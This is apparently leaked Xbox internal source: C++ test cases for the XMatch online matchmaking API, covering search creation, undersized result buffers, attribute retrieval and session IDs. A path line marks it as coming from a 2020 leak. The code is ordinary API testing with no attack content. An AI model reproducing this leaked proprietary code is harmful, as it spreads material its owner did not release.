	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = INT1;
	ParameterTest[1].dwParameterType = X_ATTRIBUTE_DATATYPE_STRING;
	ParameterTest[1].Value.pvValue = (VOID *) STRING1;
	ParameterTest[2].dwParameterType = X_ATTRIBUTE_DATATYPE_BLOB;
	ParameterTest[2].Value.pvValue = (VOID *) BLOB1;
	
	fRet = AddParameters(hSearch, ParameterTest, 3);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Search succeeded but should have failed!");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search failed as expected");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search with a stored procedure that doesn't have exec permissions");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(NOEXECPERM_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
				
	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Search succeeded but should have failed!");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search failed as expected");
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where the results length is too small for a single result");
	// -----------------------------------------------------------------
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETSESSSP_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) - 1, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = *((ULONGLONG *) &SessionID);
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(!FAILED(hr))
	{
		PASS_TESTCASE("Search succeeded even though results length specified was too small, acceptible.");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search failed as expected");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);

/* X_SSINDEX_GET_SESSION isn't publically exposed
	// -----------------------------------------------------------------
	START_TESTCASE("Create a search using X_SSINDEX_GET_SESSION index");
	// -----------------------------------------------------------------
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(X_SSINDEX_GET_SESSION, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	
	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = *((ULONGLONG *) &SessionID);
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSearchGetResults(hSearch, &ppSearchResults, &dwNumResults);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetResults returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults failed unexpectedly");
	}
	
	if(dwNumResults != 1)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults succeeded but didn't return expected number of results");
	}

	if(memcmp(&((ppSearchResults[0])->SessionID), &SessionID, sizeof(XNKID)))
	{
		FAIL_TESTCASE("Search result returned unexpected session ID!");
	}

	if(memcmp(&((ppSearchResults[0])->HostAddress), &LocalXnAddr, sizeof(XNADDR)))
	{
		FAIL_TESTCASE("Returned host address differs from local address");
	}
	
	PASS_TESTCASE("XOnlineMatchSearchGetResults returned expected result buffer");
	xLog(hLog, XLL_INFO, "ResultLen: %u; NumAttr: %u", 
		(ppSearchResults[0])->dwResultLength, (ppSearchResults[0])->dwNumAttributes);
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where the results contain all types of attributes");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETSESSALL_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = *((ULONGLONG *) &SessionID);
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSearchGetResults(hSearch, &ppSearchResults, &dwNumResults);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetResults returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults failed unexpectedly");
	}
	
	if(dwNumResults != 1)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults succeeded but didn't return expected number of results");
	}

	if(memcmp(&((ppSearchResults[0])->SessionID), &SessionID, sizeof(XNKID)))
	{
		FAIL_TESTCASE("Search result returned unexpected session ID!");
	}

	if(memcmp(&((ppSearchResults[0])->HostAddress), &LocalXnAddr, sizeof(XNADDR)))
	{
		FAIL_TESTCASE("Returned host address differs from local address");
	}

	xLog(hLog, XLL_INFO, "Getting integer attribute");
	dwAttributeLen = sizeof(bAttributeBuffer);
	hr = XOnlineMatchSearchGetAttribute(hSearch, 0, 0, &dwAttributeType, (LPVOID) bAttributeBuffer, &dwAttributeLen);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetAttribute returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute failed unexpectedly");
	}

	if(dwAttributeType != X_ATTRIBUTE_DATATYPE_INTEGER)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute");
	}

	if(dwAttributeLen != sizeof(ULONGLONG))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute length");
	}

	if(*((ULONGLONG *) bAttributeBuffer) != (ULONGLONG) INT1)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute value");
	}

	xLog(hLog, XLL_INFO, "Getting string attribute");
	dwAttributeLen = sizeof(bAttributeBuffer);
	hr = XOnlineMatchSearchGetAttribute(hSearch, 0, 1, &dwAttributeType, (LPVOID) bAttributeBuffer, &dwAttributeLen);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetAttribute returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute failed unexpectedly");
	}

	if(dwAttributeType != X_ATTRIBUTE_DATATYPE_STRING)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute");
	}

	xLog(hLog, XLL_INFO, "String attribute size reported as %u", dwAttributeLen);
	if(dwAttributeLen != (wcslen(STRING1) * 2 + 1))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute length (possibly bug 8676)");
	}

	if(wcscmp(STRING1, (WCHAR *) bAttributeBuffer))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute value");
	}

	xLog(hLog, XLL_INFO, "Getting binary attribute");
	dwAttributeLen = sizeof(bAttributeBuffer);
	hr = XOnlineMatchSearchGetAttribute(hSearch, 0, 2, &dwAttributeType, (LPVOID) bAttributeBuffer, &dwAttributeLen);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetAttribute returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute failed unexpectedly");
	}

	if(dwAttributeType != X_ATTRIBUTE_DATATYPE_BLOB)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute");
	}

	xLog(hLog, XLL_INFO, "Blob attribute size reported as %u", dwAttributeLen);
	if(dwAttributeLen != strlen(BLOB1))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute length");
	}

	if(memcmp(BLOB1, bAttributeBuffer, dwAttributeLen))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetAttribute returned unexpected attribute value");
	}


	PASS_TESTCASE("XOnlineMatchSearchGetResults returned expected result buffer");
	xLog(hLog, XLL_INFO, "ResultLen: %u; NumAttr: %u", 
		(ppSearchResults[0])->dwResultLength, (ppSearchResults[0])->dwNumAttributes);

	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
	


	// -----------------------------------------------------------------
	START_TESTCASE("Call XMatchGetNextSearchResult when only one result returned");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETSESSALL_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = *((ULONGLONG *) &SessionID);
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSearchGetResults(hSearch, &ppSearchResults, &dwNumResults);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetResults returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults failed unexpectedly");
	}
	
	if(dwNumResults != 1)
	{
		FAIL_TESTCASE("XOnlineMatchSearchGetResults succeeded but didn't return expected number of results");
	}

	if(memcmp(&((ppSearchResults[0])->SessionID), &SessionID, sizeof(XNKID)))
	{
		FAIL_TESTCASE("Search result returned unexpected session ID!");
	}

	if(memcmp(&((ppSearchResults[0])->HostAddress), &LocalXnAddr, sizeof(XNADDR)))
	{
		FAIL_TESTCASE("Returned host address differs from local address");
	}

	xLog(hLog, XLL_INFO, "Successfully retrieved first search result!");
	xLog(hLog, XLL_INFO, "ResultLen: %u; NumAttr: %u", 
		(ppSearchResults[0])->dwResultLength, (ppSearchResults[0])->dwNumAttributes);
		
	ReadSearchResults(hLog, hSearch, 1, FALSE);
		
	END_TESTCASE();
	CLEANUP_TASK(hSearch);



	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where multiple results are returned");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETTITLEALL_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 2000, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}


	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	ReadSearchResults(hLog, hSearch, 2, TRUE);
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where result buffer is smaller than a returned single result");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[0].Value.pvValue = (VOID *) BigBlob;
	AttributeTest[0].qwUserID = 0;
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 1, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETSESSBLB_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT), hEvent, &hSearch);
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = *((ULONGLONG *) &SessionID);
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

// TEMP August release won't indicate when results were truncated
//	ReadSearchResults(hLog, hSearch, 1, TRUE);
	ReadSearchResults(hLog, hSearch, 0, TRUE);
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
	

	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where result buffer is smaller than multiple results");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETTITLEALL_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) - 10, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	ReadSearchResults(hLog, hSearch, 1, TRUE);
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
	


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search where multiple results won't fit into buffer");
	// -----------------------------------------------------------------
	
	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;
	
	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(GETTITLEALL_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

// TEMP August release won't indicate when results were truncated
//	ReadSearchResults(hLog, hSearch, 2, TRUE);
	ReadSearchResults(hLog, hSearch, 1, TRUE);
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);

	

	// -----------------------------------------------------------------
	START_TESTCASE("Call work pump immediately after creating a search");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSearchCreate(GETSESSALL_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT), hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	fRet = XOnlineTaskDoWork(hSearch,0);

	if(fRet)
	{
		PASS_TESTCASE("XOnlineTaskDoWork returned TRUE");
	}
	else
	{
		FAIL_TESTCASE("XOnlineTaskDoWork returned FALSE, but should have returned TRUE");
	}
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);	



	// -----------------------------------------------------------------
	START_TESTCASE("Open and close an XMatch search without calling the work pump");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(GETSESSALL_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT), hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	XOnlineTaskClose(hSearch);
	hSearch = NULL;

	PASS_TESTCASE("XOnlineTaskClose completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);	



	// -----------------------------------------------------------------
	START_TESTCASE("Cancel a search request that has already completed and then close it");
	// -----------------------------------------------------------------
	// This case also tests the case where the search returns no results

	hr = XOnlineMatchSearchCreate(GETSESSSP_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT), hEvent, &hSearch);
	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}


	ParameterTest[0].dwParameterType = X_ATTRIBUTE_DATATYPE_INTEGER;
	ParameterTest[0].Value.qwValue = 1;
	
	fRet = AddParameters(hSearch, ParameterTest, 1);
	if(!fRet)
	{
		FAIL_TESTCASE("Couldn't add parameters to search!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}
	
	XOnlineTaskClose(hSearch);
	hSearch = NULL;
	
	PASS_TESTCASE("XOnlineTaskClose completed successfully");
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);

Exit:
	if(hEvent)
		CloseHandle(hEvent);

	if(!fCompleted && hSearch)
		XOnlineTaskClose(hSearch);

	return hr;
} // XMatchTest_CreateSearch


} // namespace XMatchTestNamespace
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\getsessionid.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_GetSessionID(HANDLE hLog);

//==================================================================================
// XMatchTest_GetSessionID
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for getting session ID's from completed creations
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_GetSessionID(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	XONLINETASK_HANDLE hMatch = NULL;
	XNKID SessionID, NewSessionID;
	HRESULT hr = E_FAIL;
	HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0;
	BOOL fCompleted = FALSE, fDone = FALSE;

	memset(&SessionID, 0, sizeof(SessionID));
	memset(&NewSessionID, 0, sizeof(NewSessionID));

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID with NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSessionGetID (NULL, &SessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionGetID  failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but should have failed!");
	}

	END_TESTCASE();
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID with NULL session ID pointer");
	// -----------------------------------------------------------------

	hMatch = NULL;
	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionGetID (hMatch, NULL);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
